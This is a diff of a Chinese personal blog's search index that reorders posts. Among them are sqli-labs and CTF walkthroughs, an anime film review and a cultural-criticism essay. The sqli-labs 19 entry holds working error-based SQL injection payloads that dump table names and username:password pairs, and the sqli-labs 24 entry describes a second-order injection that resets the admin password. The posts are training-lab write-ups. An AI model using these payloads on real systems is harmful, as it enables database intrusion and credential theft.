+<li><p>文化<br>日本没有禁“洋节”，而自己的文化依然欣欣向荣，甚至传播到其它国家。<br>现代文化方面，日本动画漫画游戏等等，都是世界知名的，从中国的角度来说，这就是对其它国家“文化入侵”。而日本人也没有排斥这些洋节，圣诞依然张灯结彩。<br>中国的现代文化，我说的尖锐点，中国压根儿没什么现代文化。影视动画除了会把各朝各代或是神话故事之类的拿出来翻拍改编，也没什么花样了。啊对了，近几年倒是又新起红色影视剧，什么战狼2啊，长津湖啊…大概也就这样了吧。科幻方面只有少数如刘慈欣的《三体》在中国赞美连连，可最近的三体动画在某评分平台上仅有3分，也是沦为笑话了。小说漫画常年排在榜单里的不是什么后宫言情就是开挂修仙玄幻之类的垃圾玩意儿。差点忘了游戏方面，腾讯网易永远都被人骂不完，也永远赚得盆满钵满。做的那些狗屁东西除了在不是“封”就是“禁”的中国大陆能搞得火热之外，到了外面根本就没有市场。<br>一说起来就成了发泄情绪的话呢。还是收一收。总之，影视动画，小说漫画和游戏等软文化的东西，都能影响一个国家，大众整体的审美能力。不如说，也是体现了大众的审美能力。在我看来，如今的大陆民众，审美能力低下，和日本起码差了好几个level。可悲吗？可悲。但我再怎么担心也没用，就这样吧。<br>他们总是这样：没有什么，就要宣扬什么；掩饰什么，就要封禁什么。</p>
+</li>
+</ol>
+<p>很多中国人不愿承认自己国家的缺陷，每次谈到不足糟糕的地方，通常会有以下几种反应：</p>
+<ul>
+<li>不承认。只要不是把确凿无疑的事实证据摆在他面前，总是会发出怀疑的声音，想以此来否定，不承认其糟糕。</li>
+<li>别的国家也没做好&#x2F;也这样。当他对铁证如山的事实无可辩驳时，就开始逃避，说某某国家也这样啊，某某国家也没做得多好。</li>
+<li>总说得好像没办法了似的或某某有其它的考虑。总是把某件事做得很糟糕归咎于外因，从不会反省自身没做好的地方。总是把一些糟糕的结果认为某官员某部门有他的“考虑”，经典话语之“下大棋”。</li>
+<li>太过激了。终于以上所有退路都没堵住后，面对批判，又会有人冒出来说，“说得太过激了”，“虽然…是没错，但也不至于这么说吧”。我只觉搞笑，当这些人面对他们老师，他们领导这种，被痛骂一顿的时候他们敢还嘴说“太过激了”吗？怎么？只有上位者具有随心所欲批评的权利吗？作为遵纪守法的纳税人，连没做好都没资格说了吗？</li>
+</ul>
+<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>今天一时来了兴致，写了这么久，写了一堆痛骂的话…既然写过一次了，以后尽可能少写。<br>早睡计划又失败了&#x2F;(ㄒoㄒ)&#x2F;~~</p>
+]]></content>
+      <categories>
+        <category>日志</category>
+      </categories>
+      <tags>
+        <tag>日志</tag>
+        <tag>生活</tag>
       </tags>
   </entry>
   <entry>
@@ -2734,38 +2734,6 @@ message.php页面<figure class="highlight php"><table><tr><td class="code"><pre>
       </tags>
   </entry>
   <entry>
-    <title>sqli-labs_19</title>
-    <url>/2022/11/15/sqli-labs_19/</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本关的思路和前一关的思路是类似的，只不过稍微作了点变化。</p>
-<span id="more"></span>
-
-<h1 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h1><ol>
-<li><p>测试并判断注入类型<br>首先username和password输入admin<br>发现返回如下情况：<br><img src="/simg/sqli-labs_19.png" alt="返回情况"><br>返回了Referer<br>Referer是HTTP头的一个字段，用于告诉服务器该网页是从哪个页面链接过来的<br>这一次，我们在Referer的字段注入。</p>
-</li>
-<li><p>获取当前<strong>数据库名和数据库版本号</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;or updatexml(1,concat(0x7e,(select database()),0x7e),1) or&#x27;</span><br><span class="line">&#x27;or updatexml(1,concat(0x7e,(select version()),0x7e),1) or&#x27;</span><br></pre></td></tr></table></figure>
-</li>
-<li><p><strong>爆表</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;or updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),0x7e),1) or&#x27;</span><br></pre></td></tr></table></figure>
-</li>
-<li><p><strong>爆字段名</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;or updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;),0x7e),1) or&#x27;</span><br></pre></td></tr></table></figure>
-</li>
-<li><p><strong>爆数据</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; or (updatexml(1,concat(0x7e,(SELECT concat_ws(&#x27;:&#x27;,username,password) FROM (SELECT username,password FROM users)text LIMIT 0,1),0x7e),1)) or &#x27; </span><br></pre></td></tr></table></figure></li>
-</ol>
-<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>思路一致，so easy~</p>
-]]></content>
-      <categories>
-        <category>SQL注入</category>
-        <category>sqli-labs</category>
-      </categories>
-      <tags>
-        <tag>SQL注入</tag>
-        <tag>sqli-labs</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>sqli-labs_20</title>
     <url>/2022/11/15/sqli-labs_20/</url>
     <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本次的难度也不大，关键是要知道方法</p>
@@ -2802,6 +2770,38 @@ message.php页面<figure class="highlight php"><table><tr><td class="code"><pre>
       </tags>
   </entry>
   <entry>
+    <title>sqli-labs_19</title>
+    <url>/2022/11/15/sqli-labs_19/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本关的思路和前一关的思路是类似的，只不过稍微作了点变化。</p>
+<span id="more"></span>
+
+<h1 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h1><ol>
+<li><p>测试并判断注入类型<br>首先username和password输入admin<br>发现返回如下情况：<br><img src="/simg/sqli-labs_19.png" alt="返回情况"><br>返回了Referer<br>Referer是HTTP头的一个字段，用于告诉服务器该网页是从哪个页面链接过来的<br>这一次，我们在Referer的字段注入。</p>
+</li>
+<li><p>获取当前<strong>数据库名和数据库版本号</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;or updatexml(1,concat(0x7e,(select database()),0x7e),1) or&#x27;</span><br><span class="line">&#x27;or updatexml(1,concat(0x7e,(select version()),0x7e),1) or&#x27;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>爆表</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;or updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),0x7e),1) or&#x27;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>爆字段名</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;or updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;),0x7e),1) or&#x27;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>爆数据</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; or (updatexml(1,concat(0x7e,(SELECT concat_ws(&#x27;:&#x27;,username,password) FROM (SELECT username,password FROM users)text LIMIT 0,1),0x7e),1)) or &#x27; </span><br></pre></td></tr></table></figure></li>
+</ol>
+<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>思路一致，so easy~</p>
+]]></content>
+      <categories>
+        <category>SQL注入</category>
+        <category>sqli-labs</category>
+      </categories>
+      <tags>
+        <tag>SQL注入</tag>
+        <tag>sqli-labs</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>sqli-labs_21+22</title>
     <url>/2022/11/15/sqli-labs_21+22/</url>
     <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这一关开始用到加解密了</p>
@@ -2824,6 +2824,32 @@ message.php页面<figure class="highlight php"><table><tr><td class="code"><pre>
 </ol>
 <h2 id="第22关"><a href="#第22关" class="headerlink" title="第22关"></a>第22关</h2><p>和第21关差不多，只不过注入方式是 “<br>修改一下就可以用了</p>
 <h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>只要判断出是那种加密方式，接下来的步骤就简单了。</p>
+]]></content>
+      <categories>
+        <category>SQL注入</category>
+        <category>sqli-labs</category>
+      </categories>
+      <tags>
+        <tag>SQL注入</tag>
+        <tag>sqli-labs</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>sqli-labs_24</title>
+    <url>/2022/11/17/sqli-labs_24/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这一关又采用了新的一种注入方式，和以往不太一样。</p>
+<span id="more"></span>
+
+<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol>
+<li><p>测试并判断注入类型<br>进入页面，我们可以看到有3个页面：log in, forgot password, new user<br>在log in 页面输入错误的账户名密码时，会返回错误页面。而当输入正确时，返回正确页面，并且可以更改密码。<br>查看源码时，可以发现，登录和注册页面都使用了mysql_real_escape_string()函数。<br>mysql_real_escape_string()函数的作用简单来说，是转义SQL语句中使用的字符串中的特殊字符。详细可看：<a href="https://www.w3school.com.cn/php/func_mysql_real_escape_string.asp">PHP mysql_real_escape_string() 函数</a><br>因此，我们无法通过用户名和密码进行注入。但是，我们在查看pass_change.php时，可以发现这一行语句：</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">$username<span class="operator">=</span> $_SESSION[&quot;username&quot;];</span><br></pre></td></tr></table></figure>
+<p>也即修改密码时，用户名不会转义。<br>通常情况下，我们并不知晓admin的账户密码，因此只能猜测用户名是admin，去创造一个新用户为<code>admin&#39;#</code>的账号来绕过admin，修改admin的密码。这里涉及到了二次注入的概念。<br>二次注入：攻击者构造的恶意数据存储在数据库后，恶意数据被读取并进入到SQL查询语句所导致的注入。防御者可能在用户输入恶意数据时对其中的特殊字符进行了转义处理，但在恶意数据插入到数据库时被处理的数据又被还原并存储在数据库中，当Web程序调用存储在数据库中的恶意数据并执行SQL查询时，就发生了SQL二次注入。<br>二次注入，可以概括为以下两步:<br>第一步：插入恶意数据进行数据库插入数据时，对其中的特殊字符进行了转义处理，在写入数据库的时候又保留了原来的数据。<br>第二步：引用恶意数据开发者默认存入数据库的数据都是安全的，在进行查询时，直接从数据库中取出恶意数据，没有进行进一步的检验的处理。</p>
+</li>
+<li><p>注册新用户绕过admin修改admin的密码<br>首先注册一个账号，名为<code>admin&#39;#</code><br>密码123456<br>然后登录该账号<br>再修改密码为111111<br>可以看到页面显示修改成功<br>我们再次登录，账号：admin  密码：111111<br>发现管理员账户登录就成功了。</p>
+</li>
+</ol>
+<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>二次注入的简单实践。</p>
+<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/Yb_140/article/details/123223306">sql-labs(1-65)</a><br><a href="https://blog.csdn.net/dreamthe/article/details/123795302">详细sqli-labs（1-65）通关讲解</a><br><a href="https://blog.csdn.net/qq_42266432/article/details/120072927">sqli-labs第二十四关(二阶注入)</a></p>
 ]]></content>
       <categories>
         <category>SQL注入</category>
@@ -2884,32 +2910,6 @@ message.php页面<figure class="highlight php"><table><tr><td class="code"><pre>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,(select group_concat(username,&#x27;:&#x27;,password) from users),3 or &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure></li>
 </ol>
 <h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>主要是把注入方式搞清楚，构造语句和原来差不多</p>
-]]></content>
-      <categories>
-        <category>SQL注入</category>
-        <category>sqli-labs</category>
-      </categories>
-      <tags>
-        <tag>SQL注入</tag>
-        <tag>sqli-labs</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>sqli-labs_24</title>
-    <url>/2022/11/17/sqli-labs_24/</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这一关又采用了新的一种注入方式，和以往不太一样。</p>
-<span id="more"></span>
-
-<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol>
-<li><p>测试并判断注入类型<br>进入页面，我们可以看到有3个页面：log in, forgot password, new user<br>在log in 页面输入错误的账户名密码时，会返回错误页面。而当输入正确时，返回正确页面，并且可以更改密码。<br>查看源码时，可以发现，登录和注册页面都使用了mysql_real_escape_string()函数。<br>mysql_real_escape_string()函数的作用简单来说，是转义SQL语句中使用的字符串中的特殊字符。详细可看：<a href="https://www.w3school.com.cn/php/func_mysql_real_escape_string.asp">PHP mysql_real_escape_string() 函数</a><br>因此，我们无法通过用户名和密码进行注入。但是，我们在查看pass_change.php时，可以发现这一行语句：</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">$username<span class="operator">=</span> $_SESSION[&quot;username&quot;];</span><br></pre></td></tr></table></figure>
-<p>也即修改密码时，用户名不会转义。<br>通常情况下，我们并不知晓admin的账户密码，因此只能猜测用户名是admin，去创造一个新用户为<code>admin&#39;#</code>的账号来绕过admin，修改admin的密码。这里涉及到了二次注入的概念。<br>二次注入：攻击者构造的恶意数据存储在数据库后，恶意数据被读取并进入到SQL查询语句所导致的注入。防御者可能在用户输入恶意数据时对其中的特殊字符进行了转义处理，但在恶意数据插入到数据库时被处理的数据又被还原并存储在数据库中，当Web程序调用存储在数据库中的恶意数据并执行SQL查询时，就发生了SQL二次注入。<br>二次注入，可以概括为以下两步:<br>第一步：插入恶意数据进行数据库插入数据时，对其中的特殊字符进行了转义处理，在写入数据库的时候又保留了原来的数据。<br>第二步：引用恶意数据开发者默认存入数据库的数据都是安全的，在进行查询时，直接从数据库中取出恶意数据，没有进行进一步的检验的处理。</p>
-</li>
-<li><p>注册新用户绕过admin修改admin的密码<br>首先注册一个账号，名为<code>admin&#39;#</code><br>密码123456<br>然后登录该账号<br>再修改密码为111111<br>可以看到页面显示修改成功<br>我们再次登录，账号：admin  密码：111111<br>发现管理员账户登录就成功了。</p>
-</li>
-</ol>
-<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>二次注入的简单实践。</p>
-<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/Yb_140/article/details/123223306">sql-labs(1-65)</a><br><a href="https://blog.csdn.net/dreamthe/article/details/123795302">详细sqli-labs（1-65）通关讲解</a><br><a href="https://blog.csdn.net/qq_42266432/article/details/120072927">sqli-labs第二十四关(二阶注入)</a></p>
 ]]></content>
       <categories>
         <category>SQL注入</category>
@@ -4267,7 +4267,7 @@ secure_file_priv 一栏的value为空，即是成功</li>
 <li>返回值<br>如果value为null，返回true，否则返回false</li>
 </ul>
 <h2 id="第15题"><a href="#第15题" class="headerlink" title="第15题"></a>第15题</h2><h3 id="PHP禁用函数"><a href="#PHP禁用函数" class="headerlink" title="PHP禁用函数"></a>PHP禁用函数</h3><p>PHP禁用函数的方法：首先打开“php.ini”配置文件；然后查找字符“disable_functions”，该字符是PHP禁用函数的配置项；接着在该配置项加上需要禁用的函数，多个函数用英文逗号分隔；最后保存重启即可。</p>
-<h2 id="第16题"><a href="#第16题" class="headerlink" title="第16题"></a>第16题</h2><h3 id="require-函数"><a href="#require-函数" class="headerlink" title="require()函数"></a>require()函数</h3><p>文件包含过程中出现错误，抛出警告，之后继续正常执行</p>
+<h2 id="第16题"><a href="#第16题" class="headerlink" title="第16题"></a>第16题</h2><h3 id="require-函数"><a href="#require-函数" class="headerlink" title="require()函数"></a>require()函数</h3><p>文件包含过程中出现错误，抛出错误，退出程序执行</p>
 <h2 id="第17题"><a href="#第17题" class="headerlink" title="第17题"></a>第17题</h2><h3 id="unlink-函数"><a href="#unlink-函数" class="headerlink" title="unlink()函数"></a>unlink()函数</h3><p>删除文件</p>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">unlink</span>(<span class="keyword">string</span> <span class="variable">$filename</span>, ?resource <span class="variable">$context</span> = <span class="literal">null</span>): <span class="keyword">bool</span></span><br></pre></td></tr></table></figure>
 <p>删除 filename。和 Unix C 的 unlink() 函数相似。 发生错误时会产生一个 E_WARNING 级别的错误。</p>
@@ -4750,27 +4750,6 @@ secure_file_priv 一栏的value为空，即是成功</li>
       </tags>
   </entry>
   <entry>
-    <title>搖曳露营movie--仰望星空的童话</title>
-    <url>/2022/11/14/%E6%90%96%E6%9B%B3%E9%9C%B2%E8%90%A5movie/</url>
-    <content><![CDATA[<p><img src="/images/yuru4.png" alt="搖曳露营"></p>
-<span id="more"></span>
-
-<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>未看电影前，零星评论让我以为会比较沉重的电影，欣赏过程中一直提心吊胆的，生怕发生点什么。但幸好，还是TV动画的味道，对于我这样一个单纯享受故事的<font color=Yellow>粉丝</font>而言，看完后很满足。<br>看的过程中，其实也感受到了<font color=orange>一点异样</font>，但为了保持良好的观影感受，我选择了忽略。既然要写影评，就应当把好的坏的都拿出来说。</p>
-<p><img src="/images/%E5%BF%97%E6%91%A9%E5%87%9B6.png" alt="凛"></p>
-<h1 id="坚守的延续"><a href="#坚守的延续" class="headerlink" title="坚守的延续"></a>坚守的延续</h1><p>虽说是电影，可其实和TV动画的差别并没有那么大。看过TV动画再来看电影的人，是熟悉的味道。<br>要说最大区别在哪里，那必然是长大了后的女孩们。通过电影一些细节猜测，设定在7-10年后，除了女孩们有所改变，其他人都是熟悉而无所变化的。当然，毕竟电影只有2小时，这些人的改变是完全不够篇幅的。<br><img src="/images/%E6%8A%9A%E5%AD%902.png" alt="抚子"><br><font color=blue>凛</font>成了挤电车的编辑部撰稿人，<font color=blue>抚子</font>是露营店的店员，<font color=blue>葵</font>是小学教师，<font color=blue>惠那</font>是宠物店的店员，<font color=blue>千明</font>在旅游振兴机构工作。<br>每个人的职业都相当的简单易懂。单论她们的职业，从她们每天过得情况来看，其实是相当理想的吧。不过还是能从中看出社会人的一些心酸，比如凛加班啊，葵所在的学校拆掉了啊，千明从东京辞职啊之类的。我们可以看出，制作组对于本动画是极力想要维持TV动画的氛围，因此而舍弃了社会上阴暗沉重的部分，转而把重心维持在美好的一面。可以看出，电影是面向粉丝以及想要轻松观看的人群。也就是说，其实受到了前作限制，不能发挥出更具自我的风格。<font color=SeaGreen>电影内的女孩们的现实约束少了，可电影外的制作组约束却多了。</font><br><img src="/images/%E5%BF%97%E6%91%A9%E5%87%9B5.png" alt="搖曳露营"><br>对于不同立场的人，评价也就自然不同了，单论粉丝，我想是相对满意的。对于社会人，可能因为没有表达出他们在社会的心酸而没那么满意。站在一个更高的台阶上看，是能做到更深刻却没做到，造成了部分人的失望。<br><font color=SeaGreen>但无论如何，对于一般人，这部电影也是值得看一遍的，仅一遍。当然，粉丝另论。</font></p>
-<p><img src="/images/%E5%87%9B+%E6%8A%9A%E5%AD%907.png" alt="凛和抚子"></p>
-<h1 id="后劲不足"><a href="#后劲不足" class="headerlink" title="后劲不足"></a>后劲不足</h1><p><font color=red>电影提出了一个很有意思的话题，传承</font>。是抚子和凛在泡温泉的时候提出来的。这就从第一季的自然享受，第二季的人文情怀，拔升到了电影的露营传承。正因为想要和别人分享这种露营的乐趣，所以建立了这个露营场。虽然电影里没有多少实际的完整露营，但依然是搖曳露营的精神在参与。让她们传递乐趣给别人的根本原因，在于对露营的热爱。而每个人，都应有自己所热爱的事物，也就能明白露营女孩们为何能热情参与建立露营场。我自身也对此颇有感触，热爱动画的我，又在多少个夜里，幻想能自己创立一家动画公司，幻想自己参与一部动画的制作…<br><img src="/images/yuru3.png" alt="搖曳露营"><br>电影的现实上，是很让人匪夷所思的。明明凛单程就需要4小时，她们又都不在同一个地方，却让人感觉随时都有时间一起待在露营场，搭建过程中也从未遇到大的挫折。<font color=SlateGray>不由得让人觉得，是不是有些童话了呢？</font>又或许，制作组本意就是做出成人的童话？这样一来，就感受到了电影水平上升受到了限制，有种流于表面的感觉。多一些遭遇困难，面对困境的细节，我想会更棒吧。<br><img src="/images/%E7%8A%AC%E5%B1%B1%E8%91%B52.png" alt="搖曳露营"><br>老实说，结构非常地普通，从欢乐到哀伤再到欢乐，有些地方有点刻意，很遗憾没有发挥出作为电影的特点。<br><font color=Fuchsia>总而言之，电影是佳作，TV动画是神作。</font></p>
-]]></content>
-      <categories>
-        <category>动画</category>
-        <category>搖曳露营</category>
-      </categories>
-      <tags>
-        <tag>动画</tag>
-        <tag>搖曳露营</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>攻防世界-Web_php_include</title>
     <url>/2022/12/24/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-Web_php_include/</url>
     <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>基础题，多种解法。</p>
@@ -4804,6 +4783,27 @@ secure_file_priv 一栏的value为空，即是成功</li>
       <tags>
         <tag>CTF</tag>
         <tag>文件包含</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>搖曳露营movie--仰望星空的童话</title>
+    <url>/2022/11/14/%E6%90%96%E6%9B%B3%E9%9C%B2%E8%90%A5movie/</url>
+    <content><![CDATA[<p><img src="/images/yuru4.png" alt="搖曳露营"></p>
+<span id="more"></span>
+
+<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>未看电影前，零星评论让我以为会比较沉重的电影，欣赏过程中一直提心吊胆的，生怕发生点什么。但幸好，还是TV动画的味道，对于我这样一个单纯享受故事的<font color=Yellow>粉丝</font>而言，看完后很满足。<br>看的过程中，其实也感受到了<font color=orange>一点异样</font>，但为了保持良好的观影感受，我选择了忽略。既然要写影评，就应当把好的坏的都拿出来说。</p>
+<p><img src="/images/%E5%BF%97%E6%91%A9%E5%87%9B6.png" alt="凛"></p>
+<h1 id="坚守的延续"><a href="#坚守的延续" class="headerlink" title="坚守的延续"></a>坚守的延续</h1><p>虽说是电影，可其实和TV动画的差别并没有那么大。看过TV动画再来看电影的人，是熟悉的味道。<br>要说最大区别在哪里，那必然是长大了后的女孩们。通过电影一些细节猜测，设定在7-10年后，除了女孩们有所改变，其他人都是熟悉而无所变化的。当然，毕竟电影只有2小时，这些人的改变是完全不够篇幅的。<br><img src="/images/%E6%8A%9A%E5%AD%902.png" alt="抚子"><br><font color=blue>凛</font>成了挤电车的编辑部撰稿人，<font color=blue>抚子</font>是露营店的店员，<font color=blue>葵</font>是小学教师，<font color=blue>惠那</font>是宠物店的店员，<font color=blue>千明</font>在旅游振兴机构工作。<br>每个人的职业都相当的简单易懂。单论她们的职业，从她们每天过得情况来看，其实是相当理想的吧。不过还是能从中看出社会人的一些心酸，比如凛加班啊，葵所在的学校拆掉了啊，千明从东京辞职啊之类的。我们可以看出，制作组对于本动画是极力想要维持TV动画的氛围，因此而舍弃了社会上阴暗沉重的部分，转而把重心维持在美好的一面。可以看出，电影是面向粉丝以及想要轻松观看的人群。也就是说，其实受到了前作限制，不能发挥出更具自我的风格。<font color=SeaGreen>电影内的女孩们的现实约束少了，可电影外的制作组约束却多了。</font><br><img src="/images/%E5%BF%97%E6%91%A9%E5%87%9B5.png" alt="搖曳露营"><br>对于不同立场的人，评价也就自然不同了，单论粉丝，我想是相对满意的。对于社会人，可能因为没有表达出他们在社会的心酸而没那么满意。站在一个更高的台阶上看，是能做到更深刻却没做到，造成了部分人的失望。<br><font color=SeaGreen>但无论如何，对于一般人，这部电影也是值得看一遍的，仅一遍。当然，粉丝另论。</font></p>
+<p><img src="/images/%E5%87%9B+%E6%8A%9A%E5%AD%907.png" alt="凛和抚子"></p>
+<h1 id="后劲不足"><a href="#后劲不足" class="headerlink" title="后劲不足"></a>后劲不足</h1><p><font color=red>电影提出了一个很有意思的话题，传承</font>。是抚子和凛在泡温泉的时候提出来的。这就从第一季的自然享受，第二季的人文情怀，拔升到了电影的露营传承。正因为想要和别人分享这种露营的乐趣，所以建立了这个露营场。虽然电影里没有多少实际的完整露营，但依然是搖曳露营的精神在参与。让她们传递乐趣给别人的根本原因，在于对露营的热爱。而每个人，都应有自己所热爱的事物，也就能明白露营女孩们为何能热情参与建立露营场。我自身也对此颇有感触，热爱动画的我，又在多少个夜里，幻想能自己创立一家动画公司，幻想自己参与一部动画的制作…<br><img src="/images/yuru3.png" alt="搖曳露营"><br>电影的现实上，是很让人匪夷所思的。明明凛单程就需要4小时，她们又都不在同一个地方，却让人感觉随时都有时间一起待在露营场，搭建过程中也从未遇到大的挫折。<font color=SlateGray>不由得让人觉得，是不是有些童话了呢？</font>又或许，制作组本意就是做出成人的童话？这样一来，就感受到了电影水平上升受到了限制，有种流于表面的感觉。多一些遭遇困难，面对困境的细节，我想会更棒吧。<br><img src="/images/%E7%8A%AC%E5%B1%B1%E8%91%B52.png" alt="搖曳露营"><br>老实说，结构非常地普通，从欢乐到哀伤再到欢乐，有些地方有点刻意，很遗憾没有发挥出作为电影的特点。<br><font color=Fuchsia>总而言之，电影是佳作，TV动画是神作。</font></p>
+]]></content>
+      <categories>
+        <category>动画</category>
+        <category>搖曳露营</category>
+      </categories>
+      <tags>
+        <tag>动画</tag>
+        <tag>搖曳露营</tag>
       </tags>
   </entry>
   <entry>
@@ -4881,6 +4881,26 @@ secure_file_priv 一栏的value为空，即是成功</li>
       </tags>
   </entry>
   <entry>
+    <title>攻防世界-baby_web</title>
+    <url>/2022/12/14/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-baby_web/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>也是一道非常简单的题目</p>
+<span id="more"></span>
+<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol>
+<li><p>看题<br>非常简单，就是要我们访问初始界面:index.php。<br>但问题是初始界面无法访问，总是会被重定向为:1.php。</p>
+</li>
+<li><p>抓包解决<br>既然在网页中不能访问初始界面，那么我们直接抓包。<br>抓包后送到Repeater，然后将1.php改为index.php，再send<br>之后即可在response中拿到flag</p>
+</li>
+</ol>
+]]></content>
+      <categories>
+        <category>CTF</category>
+        <category>Web</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>攻防世界-file_include</title>
     <url>/2022/12/14/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-file_include/</url>
     <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>感觉挺开心的。</p>
@@ -4917,23 +4937,28 @@ secure_file_priv 一栏的value为空，即是成功</li>
       </tags>
   </entry>
   <entry>
-    <title>攻防世界-baby_web</title>
-    <url>/2022/12/14/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-baby_web/</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>也是一道非常简单的题目</p>
+    <title>攻防世界-fileinclde</title>
+    <url>/2022/11/14/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-fileinclude/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>换了种方式，就不会了。</p>
 <span id="more"></span>
 <h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol>
-<li><p>看题<br>非常简单，就是要我们访问初始界面:index.php。<br>但问题是初始界面无法访问，总是会被重定向为:1.php。</p>
-</li>
-<li><p>抓包解决<br>既然在网页中不能访问初始界面，那么我们直接抓包。<br>抓包后送到Repeater，然后将1.php改为index.php，再send<br>之后即可在response中拿到flag</p>
-</li>
+<li>查看源码<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!?php</span><br><span class="line"><span class="keyword">if</span>( !<span class="title function_ invoke__">ini_get</span>(<span class="string">&#x27;display_errors&#x27;</span>) ) &#123;</span><br><span class="line">  <span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;display_errors&#x27;</span>, <span class="string">&#x27;On&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(E_ALL);</span><br><span class="line"><span class="variable">$lan</span> = <span class="variable">$_COOKIE</span>[<span class="string">&#x27;language&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$lan</span>)</span><br><span class="line">&#123;</span><br><span class="line">	@<span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;language&quot;</span>,<span class="string">&quot;english&quot;</span>);</span><br><span class="line">	@<span class="keyword">include</span>(<span class="string">&quot;english.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">	@<span class="keyword">include</span>(<span class="variable">$lan</span>.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$x</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$x</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li>
 </ol>
